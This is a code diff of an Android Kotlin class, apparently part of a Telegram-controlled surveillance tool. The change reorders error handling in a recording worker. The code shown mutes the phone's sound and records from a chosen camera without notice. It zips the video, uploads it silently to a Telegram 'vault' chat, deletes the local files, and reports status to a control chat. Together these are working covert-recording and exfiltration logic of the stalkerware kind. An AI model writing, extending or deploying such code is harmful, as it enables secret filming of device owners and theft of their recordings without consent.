@@ -31,7 +31,7 @@ import java.util.zip.ZipOutputStream
  * ✅ تم إصلاح مشكلة تغيير وضع الصوت (ringerMode) بإضافة التحقق من إذن ACCESS_NOTIFICATION_POLICY.
  * ✅ تم إزالة System.gc() غير الضرورية لتحسين الأداء.
  * ✅ تم إضافة التحقق من السياق (appContext) قبل إنشاء MediaRecorder لتجنب NullPointerException.
- * ✅ تمت إضافة توثيق وتحسينات في معالجة الأخطاء.
+ * ✅ تم إصلاح استعادة الصوت باستخدام try-finally شامل.
  */
 class StreamManager(
     context: Context,
@@ -208,7 +208,6 @@ class StreamManager(
 
     // ============================================================
     //  كتم واستعادة الصوت (مع التحقق من صلاحية الإشعارات)
-    // ✅ تم إصلاح المشكلة بإضافة التحقق من ACCESS_NOTIFICATION_POLICY
     // ============================================================
 
     private fun muteAudio(mute: Boolean) {
@@ -438,11 +437,10 @@ class StreamManager(
     }
 
     // ============================================================
-    //  معالج التسجيل الرئيسي (Worker)
+    //  معالج التسجيل الرئيسي (Worker) - معدل
     // ============================================================
 
     private suspend fun worker(mon: Any, camIdx: Int, dur: Int) {
-        // ✅ التحقق من وجود السياق قبل البدء
         val ctx = appContext ?: run {
             writeLog("App context is null, cannot start recording worker")
             return
@@ -468,10 +466,10 @@ class StreamManager(
         var success = false
         var mediaRecorder: MediaRecorder? = null
 
+        // ===== كتم الصوت قبل البدء، واستعادته في finally =====
         muteAudio(true)
-
         try {
-            // ✅ استخدام السياق الآمن ctx بدلاً من appContext!!
+            // ===== مرحلة التسجيل =====
             mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 MediaRecorder(ctx)
             } else {
@@ -551,10 +549,76 @@ class StreamManager(
                 }
             }
 
+            // ===== مرحلة معالجة وتغليف الفيديو (تتم داخل نفس الـ try) =====
+            if (success && isVideoValid(tempPath)) {
+                try {
+                    val tempFile = File(tempPath)
+                    val rawFile = File(rawPath)
+                    val zipFile = File(zippedPath)
+
+                    if (tempFile.exists()) {
+                        tempFile.renameTo(rawFile)
+                    }
+
+                    val zipSuccess = createZip(zipFile, rawFile)
+                    val vaultChatId = getMonVaultChatId(mon)
+
+                    if (zipSuccess && tg != null && vaultChatId != null) {
+                        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+                        val caption = "🎥 ${resKey}p | الكاميرا $camIdx | $timeStr"
+
+                        val resp = invokeMethod(
+                            tg,
+                            "_api",
+                            "sendDocument",
+                            mapOf(
+                                "chat_id" to vaultChatId,
+                                "caption" to caption,
+                                "disable_notification" to true
+                            ),
+                            mapOf("document" to zipFile)
+                        )
+
+                        val isSent = (resp as? Map<*, *>)?.get("ok") as? Boolean ?: false
+                        if (isSent) {
+                            sendStatusUpdate("✅ تم رفع الفيديو بنجاح", ctrlChatId)
+                        } else {
+                            sendStatusUpdate("⚠️ فشل رفع الفيديو إلى الخزنة", ctrlChatId)
+                        }
+                    } else {
+                        sendStatusUpdate("⚠️ لا يوجد قناة خزنة لإرسال الفيديو", ctrlChatId)
+                    }
+
+                    safeRemove(rawFile)
+                    safeRemove(zipFile)
+
+                } catch (e: Exception) {
+                    writeLog("Finalization error: ${e.message}")
+                    sendStatusUpdate("❌ فشل رفع الفيديو: ${e.message?.take(50)}", ctrlChatId)
+                    safeRemove(File(rawPath))
+                    safeRemove(File(zippedPath))
+                }
+            } else {
+                safeRemove(File(tempPath))
+
+                if (!shouldStopFlag.get()) {
+                    sendStatusUpdate("⚠️ فشل التسجيل (ملف تالف أو غير صالح)", ctrlChatId)
+                } else {
+                    sendStatusUpdate("⏹️ تم إلغاء التسجيل", ctrlChatId)
+                }
+            }
+
+            // تنظيف إضافي
+            safeRemove(File(tempPath))
+            safeRemove(File(rawPath))
+            safeRemove(File(zippedPath))
+
         } catch (e: Exception) {
-            writeLog("Recording worker error: ${e.message}")
-            success = false
+            // أي استثناء غير متوقع في أي مرحلة
+            writeLog("Unexpected error in worker: ${e.message}")
+            sendStatusUpdate("❌ خطأ غير متوقع: ${e.message?.take(50)}", ctrlChatId)
         } finally {
+            // ✅ استعادة الصوت دائماً، بالإضافة إلى تحرير موارد MediaRecorder
             try {
                 mediaRecorder?.reset()
                 mediaRecorder?.release()
@@ -563,71 +627,6 @@ class StreamManager(
             }
             muteAudio(false)
         }
-
-        // ===== مرحلة معالجة وتغليف الفيديو =====
-
-        if (success && isVideoValid(tempPath)) {
-            try {
-                val tempFile = File(tempPath)
-                val rawFile = File(rawPath)
-                val zipFile = File(zippedPath)
-
-                if (tempFile.exists()) {
-                    tempFile.renameTo(rawFile)
-                }
-
-                val zipSuccess = createZip(zipFile, rawFile)
-                val vaultChatId = getMonVaultChatId(mon)
-
-                if (zipSuccess && tg != null && vaultChatId != null) {
-                    val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-                    val caption = "🎥 ${resKey}p | الكاميرا $camIdx | $timeStr"
-
-                    val resp = invokeMethod(
-                        tg,
-                        "_api",
-                        "sendDocument",
-                        mapOf(
-                            "chat_id" to vaultChatId,
-                            "caption" to caption,
-                            "disable_notification" to true
-                        ),
-                        mapOf("document" to zipFile)
-                    )
-
-                    val isSent = (resp as? Map<*, *>)?.get("ok") as? Boolean ?: false
-                    if (isSent) {
-                        sendStatusUpdate("✅ تم رفع الفيديو بنجاح", ctrlChatId)
-                    } else {
-                        sendStatusUpdate("⚠️ فشل رفع الفيديو إلى الخزنة", ctrlChatId)
-                    }
-                } else {
-                    sendStatusUpdate("⚠️ لا يوجد قناة خزنة لإرسال الفيديو", ctrlChatId)
-                }
-
-                safeRemove(rawFile)
-                safeRemove(zipFile)
-
-            } catch (e: Exception) {
-                writeLog("Finalization error: ${e.message}")
-                sendStatusUpdate("❌ فشل رفع الفيديو: ${e.message?.take(50)}", ctrlChatId)
-                safeRemove(File(rawPath))
-                safeRemove(File(zippedPath))
-            }
-        } else {
-            safeRemove(File(tempPath))
-
-            if (!shouldStopFlag.get()) {
-                sendStatusUpdate("⚠️ فشل التسجيل (ملف تالف أو غير صالح)", ctrlChatId)
-            } else {
-                sendStatusUpdate("⏹️ تم إلغاء التسجيل", ctrlChatId)
-            }
-        }
-
-        // تنظيف إضافي
-        safeRemove(File(tempPath))
-        safeRemove(File(rawPath))
-        safeRemove(File(zippedPath))
     }
 
     // ============================================================
